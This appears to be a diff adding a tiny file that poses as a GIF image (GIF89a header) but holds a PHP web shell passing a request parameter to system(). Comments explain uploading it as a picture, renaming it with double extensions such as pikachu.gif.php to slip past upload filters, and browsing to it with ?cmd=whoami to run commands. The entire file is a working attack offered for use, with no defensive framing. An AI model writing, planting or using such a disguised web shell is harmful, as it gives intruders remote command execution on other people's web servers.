@@ -1,0 +1,6 @@
+GIF89a
+<? php echo system($_REQUEST['cmd']); ?>
+
+//delete this comment: upload as gif, you can try to rename this as pikachu.php or pikachu.gif or pikachu.gif.html, browse to ‘image’ to execute.
+
+//Now browse to:   /images/pikachu.gif.php?cmd=whoami
